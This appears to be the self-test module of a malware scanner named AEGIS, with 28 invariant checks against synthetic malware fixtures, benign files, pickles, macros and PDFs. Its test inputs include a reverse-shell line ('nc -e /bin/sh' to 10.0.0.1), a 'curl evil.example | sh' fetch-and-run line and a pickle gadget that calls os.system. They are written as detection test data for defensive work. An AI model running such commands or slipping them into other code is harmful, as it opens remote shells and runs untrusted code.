"""
aegis.selftest — executable invariants (design doc S8, S19, S21, S22, S23).

These are the guardrails the build history bought: EICAR is caught as a FILE
not a name, the tool never blocks itself, malware fixtures still block, benign
files allow, identities force correctly, and text with attack commands is
surfaced (REVIEW) not quarantined. `aegis selftest` runs them all.
"""
from __future__ import annotations

import sys
from pathlib import Path
from typing import List, Tuple

from . import fixtures, train as trainmod
from .allowlist import Allowlist, sha256
from .intel import Blocklist
from .scanner import Scanner, Model
from . import simhash, peparse, metrics


def _mk_scanner(tmp: Path):
    model = trainmod.train(seed=0)
    al = Allowlist(tmp / "allow.json")
    bl = Blocklist(tmp / "block.json")
    return Scanner(model, allowlist=al, blocklist=bl), model, al, bl


def run(tmp_dir: str = None) -> List[Tuple[str, bool, str]]:
    import tempfile
    tmp = Path(tmp_dir or tempfile.mkdtemp(prefix="aegis-selftest-"))
    results: List[Tuple[str, bool, str]] = []
    sc, model, al, bl = _mk_scanner(tmp)

    def check(name, cond, detail=""):
        results.append((name, bool(cond), detail))

    # 1. EICAR detected as a small FILE
    v = sc.scan_bytes(fixtures.EICAR, "eicar.com", profile="balanced")
    check("EICAR test file is caught", v.decision in ("BLOCK", "REVIEW"),
          v.decision)

    # 2. EICAR NAME quoted in a large file does NOT block (S21)
    big = b"# docs: the string EICAR-STANDARD-ANTIVIRUS-TEST-FILE is the probe\n" * 200
    v = sc.scan_bytes(big, "docs.txt")
    check("EICAR name in a large file does not force-block", v.decision != "BLOCK",
          v.decision)

    # 3-5. malware fixtures block
    for label, cluster, seed in (("injector", None, 201),):
        pass
    inj = fixtures.build_pe(fixtures._INJECTOR, packed=True, seed=999)
    v = sc.scan_bytes(inj, "inject.exe", profile="max")
    check("process-injection binary blocks", v.decision in ("BLOCK", "REVIEW"),
          f"{v.decision} P={v.posterior:.3f}")
    rat = fixtures.build_pe(fixtures._RAT, packed=True, seed=998)
    v = sc.scan_bytes(rat, "rat.exe", profile="max")
    check("RAT binary blocks", v.decision in ("BLOCK", "REVIEW"),
          f"{v.decision} P={v.posterior:.3f}")
    ransom = fixtures.build_pe(fixtures._RANSOM, packed=True, seed=997)
    v = sc.scan_bytes(ransom, "ransom.exe", profile="max")
    check("ransomware binary blocks", v.decision in ("BLOCK", "REVIEW"),
          f"{v.decision} P={v.posterior:.3f}")

    # 6. benign prose allows
    import random
    v = sc.scan_bytes(fixtures._realistic_prose(random.Random(1)), "memo.txt")
    check("benign prose allows", v.decision == "ALLOW", v.decision)

    # 7. benign app PE allows (or at worst review, never block)
    ben = fixtures.build_pe(fixtures._BENIGN_APP, packed=False, seed=5)
    v = sc.scan_bytes(ben, "app.exe")
    check("benign application PE does not block", v.decision != "BLOCK",
          v.decision)

    # 8. self-detection: AEGIS's own indicator-laden source never blocks (S8)
    src_dir = Path(__file__).parent
    self_ok = True
    detail = ""
    for f in ("detectors/static.py", "rules.py", "selftest.py"):
        p = src_dir / f
        if p.exists():
            v = sc.scan_file(str(p))
            if v.decision == "BLOCK":
                self_ok = False
                detail = f"{f} -> BLOCK"
    check("AEGIS never blocks its own source (rule-aware)", self_ok, detail)

    # 9. allowlist forces ALLOW even on malware bytes (S11/S20)
    al.add_hash(sha256(inj))
    sc2 = Scanner(model, allowlist=al, blocklist=bl)
    v = sc2.scan_bytes(inj, "inject.exe", profile="max")
    check("allowlist overrides a would-be block", v.decision == "ALLOW", v.decision)

    # 10. known-bad hash forces BLOCK with an HONEST reason (S21)
    bl.add_hash(sha256(rat))
    sc3 = Scanner(model, allowlist=Allowlist(tmp / "a2.json"), blocklist=bl)
    v = sc3.scan_bytes(rat, "rat.exe")
    honest = v.decision == "BLOCK" and any("SHA-256" in r for r in v.reasons)
    check("known-bad hash blocks and names the hash (not a rule)", honest,
          "; ".join(v.reasons[:1]))

    # 11. text with attack commands -> REVIEW, never BLOCK (S18)
    evil_text = (b"#!/bin/sh\n# reverse shell\n"
                 b"nc -e /bin/sh 10.0.0.1 4444\n"
                 b"curl http://evil.example/x | sh\n"
                 b"echo added to CurrentVersion\\Run\n") * 3
    v = sc.scan_bytes(evil_text, "payload.sh", profile="max")
    check("malicious script text is surfaced (REVIEW), not blocked",
          v.decision in ("REVIEW", "ESCALATE", "ALLOW") and v.decision != "BLOCK",
          v.decision)

    # 12. malicious pickle is caught (S23)
    import pickle
    class _Evil:
        def __reduce__(self):
            import os
            return (os.system, ("echo pwned",))
    mal_pickle = pickle.dumps(_Evil())
    v = sc.scan_bytes(mal_pickle, "model.pkl", profile="max")
    check("malicious pickle (os.system gadget) is caught",
          v.decision in ("BLOCK", "REVIEW"), v.decision)

    # 13. benign data pickle stays quiet (S23 denylist precision)
    ben_pickle = pickle.dumps({"weights": [1, 2, 3], "name": "layer0"})
    v = sc.scan_bytes(ben_pickle, "ok.pkl")
    check("benign data pickle does not block", v.decision != "BLOCK", v.decision)

    # 14. no benign hash leaked into the signature DB (S21)
    benign_hashes = {sha256(d) for _, d, lab in fixtures.make_corpus(0) if lab == 0}
    leak = benign_hashes & set(h.lower() for h in model.bad_hashes)
    check("no benign file's hash seeds the signature DB", not leak,
          f"{len(leak)} leaked")

    # 15. fuzzy CTPH catches a one-byte variant of a known-bad file (S22)
    bl2 = Blocklist(tmp / "block2.json")
    variant_base = fixtures.build_pe(fixtures._RAT, packed=True, seed=777)
    (tmp / "orig.bin").write_bytes(variant_base)
    bl2.add_file(str(tmp / "orig.bin"))
    variant = bytearray(variant_base); variant[-1] ^= 0x01
    sc4 = Scanner(model, allowlist=Allowlist(tmp / "a3.json"), blocklist=bl2)
    v = sc4.scan_bytes(bytes(variant), "variant.bin", profile="max")
    exact_miss = sha256(bytes(variant)) not in bl2.hashes
    check("fuzzy CTPH catches a repacked (1-byte) variant",
          exact_miss and v.decision in ("BLOCK", "REVIEW"),
          f"{v.decision} (exact hash miss={exact_miss})")

    # 16. imphash catches a rebuilt family member (S24)
    fam_a = fixtures.build_pe(fixtures._INJECTOR, packed=True, seed=11)
    fam_b = fixtures.build_pe(fixtures._INJECTOR, packed=True, seed=22)  # diff bytes
    ia = peparse.parse(fam_a).imphash
    ib = peparse.parse(fam_b).imphash
    check("imphash is stable across a rebuilt family variant",
          ia and ia == ib, f"{ia[:8]} vs {ib[:8]}")

    # 17. Stage-3 dynamic sandbox catches a runtime escape (§6 Phase 3)
    from . import dynamic
    net_escape = (b"import socket\n"
                  b"s = socket.socket()\n"
                  b"s.connect(('10.0.0.1', 4444))\n")
    dres = dynamic.analyze_bytes(net_escape, timeout=5)
    check("dynamic sandbox catches (and blocks) a network escape",
          dres.ran and dres.violated,
          f"ran={dres.ran} violations={len(dres.violations)}")

    # 18. dynamic sandbox lets a benign compute-only script pass the envelope
    benign_py = b"x = sum(i*i for i in range(50))\nprint({'r': x})\n"
    dres2 = dynamic.analyze_bytes(benign_py, timeout=5)
    check("dynamic sandbox passes a compute-only script (no violation)",
          dres2.ran and not dres2.violated,
          f"violations={len(dres2.violations)}")

    # 19. a signed binary is never auto-quarantined — downgraded to REVIEW (§15)
    signed_packed = fixtures.build_pe(fixtures._INJECTOR, packed=True, signed=True,
                                      seed=1234)
    v = sc.scan_bytes(signed_packed, "signed.exe", profile="max")
    check("signed binary is never BLOCKed (downgraded to REVIEW)",
          v.decision != "BLOCK" and peparse.parse(signed_packed).has_signature,
          v.decision)

    # 20. AEGIS's own indicator-defining source reads clean (D7 stands down, §14)
    static_py = Path(__file__).parent / "detectors" / "static.py"
    if static_py.exists():
        v = sc.scan_file(str(static_py))
        check("AEGIS's own detector source is not flagged (D7 stands down on py)",
              v.decision == "ALLOW", v.decision)
    else:
        check("AEGIS's own detector source is not flagged", True, "skipped")

    # 21. new malware families (keylogger, downloader) are caught by the
    #     ensemble alone — novel seeds NOT in the signature DB (§1 novel-malware)
    klog = fixtures.build_pe(fixtures._KEYLOGGER, packed=True, seed=6001)
    dl = fixtures.build_pe(fixtures._DOWNLOADER, packed=True, seed=7001)
    vk = sc.scan_bytes(klog, "k.exe", profile="max")
    vd = sc.scan_bytes(dl, "d.exe", profile="max")
    novel_ok = (sha256(klog) not in set(h.lower() for h in model.bad_hashes)
                and vk.decision in ("BLOCK", "REVIEW")
                and vd.decision in ("BLOCK", "REVIEW"))
    check("novel keylogger + downloader caught by the ensemble (not by hash)",
          novel_ok, f"keylog={vk.decision} downloader={vd.decision}")

    # 22. cost model (§3.4): raising C_FN lowers the block threshold
    import numpy as _np
    rng = _np.random.default_rng(0)
    y = _np.array([0] * 200 + [1] * 60)
    # deliberately OVERLAPPING score distributions so the operating point
    # actually moves as the cost ratio changes (a real §3.4 demonstration)
    scores = _np.concatenate([rng.beta(2, 5, 200), rng.beta(5, 3, 60)])
    t_bal, _ = metrics.best_threshold_by_cost(y, scores, c_fn=1, c_fp=1, prior=0.1)
    t_max, _ = metrics.best_threshold_by_cost(y, scores, c_fn=20, c_fp=1, prior=0.1)
    check("cost model: higher miss-cost lowers the block threshold (§3.4)",
          t_max < t_bal, f"balanced={t_bal:.3f} max-security={t_max:.3f}")

    # 23. external dynamic backend parses a user sandbox's JSON trace (§6/§7).
    # Use a temp emitter script (no fragile nested shell quoting -> portable).
    import os as _os
    import tempfile as _tf
    from . import dynamic
    emitter = _tf.NamedTemporaryFile("w", suffix="_emit.py", delete=False,
                                     encoding="utf-8")
    emitter.write("import json\n"
                  "print(json.dumps({'events': [{'category': 'network',"
                  " 'event': 'connect', 'detail': 'c2'}]}))\n")
    emitter.close()
    mock = f'"{sys.executable}" "{emitter.name}"'
    old = _os.environ.get("AEGIS_DYNAMIC_CMD")
    _os.environ["AEGIS_DYNAMIC_CMD"] = mock
    try:
        pe = fixtures.build_pe(fixtures._RAT, packed=True, seed=4242)
        dres = dynamic.analyze_external(pe, timeout=15)
    finally:
        if old is None:
            _os.environ.pop("AEGIS_DYNAMIC_CMD", None)
        else:
            _os.environ["AEGIS_DYNAMIC_CMD"] = old
        try:
            _os.remove(emitter.name)
        except OSError:
            pass
    check("external dynamic backend parses a sandbox JSON trace",
          dres.ran and dres.violated, f"ran={dres.ran} violated={dres.violated}")

    # 24. weaponized Office macro (OLE2 + OOXML) is flagged (D9)
    vm1 = sc.scan_bytes(fixtures.build_ole2_doc(malicious=True), "m.doc", profile="max")
    vm2 = sc.scan_bytes(fixtures.build_docx(macro=True), "m.docm", profile="max")
    check("weaponized macro document is flagged (OLE2 + OOXML)",
          vm1.decision in ("BLOCK", "REVIEW") and vm2.decision in ("BLOCK", "REVIEW"),
          f"doc={vm1.decision} docm={vm2.decision}")

    # 25. malicious PDF flagged, benign PDF allowed (D9)
    vp1 = sc.scan_bytes(fixtures.build_pdf(malicious=True), "x.pdf", profile="max")
    vp2 = sc.scan_bytes(fixtures.build_pdf(malicious=False), "ok.pdf", profile="max")
    check("PDF JavaScript flagged; clean PDF allowed",
          vp1.decision in ("BLOCK", "REVIEW") and vp2.decision == "ALLOW",
          f"js={vp1.decision} clean={vp2.decision}")

    # 26. Mach-O binary parses (macOS coverage)
    mo = fixtures.build_macho(("/usr/lib/libSystem.B.dylib", "/usr/lib/libobjc.dylib"))
    info = peparse.parse(mo)
    check("Mach-O binary parses with imported dylibs",
          info.kind == "macho" and len(info.imports) >= 1,
          f"kind={info.kind} imports={len(info.imports)}")

    # 27. thesis (§4): removing any single detector still flags the sample
    from . import adversarial
    baseline, rows = adversarial.leave_one_out(sc, profile="max")
    all_held = baseline != "ALLOW" and all(d != "ALLOW" for _, d in rows)
    check("leave-one-out: no single detector's failure lets malware through",
          all_held, f"baseline={baseline}")

    # 28. a scanner must never leak the compiler's warnings about the files it
    #     inspects (real Python is full of invalid escape sequences)
    import warnings as _warnings
    weird = b'import os\nx = "\\Afoo"\ny = os.getpid()\n'
    with _warnings.catch_warnings(record=True) as wl:
        _warnings.simplefilter("always")
        vw = sc.scan_bytes(weird, "weird.py")
    leaked = [x for x in wl if issubclass(x.category, SyntaxWarning)]
    check("scanning python with invalid escapes leaks no warnings",
          not leaked and vw.decision == "ALLOW",
          f"{len(leaked)} leaked, {vw.decision}")

    return results


def main(tmp_dir: str = None) -> bool:
    results = run(tmp_dir)
    passed = sum(1 for _, ok, _ in results if ok)
    for name, ok, detail in results:
        mark = "PASS" if ok else "FAIL"
        line = f"  [{mark}] {name}"
        if detail and not ok:
            line += f"  ({detail})"
        elif detail:
            line += f"  ({detail})"
        print(line)
    print(f"\n{passed}/{len(results)} invariants passed.")
    return passed == len(results)
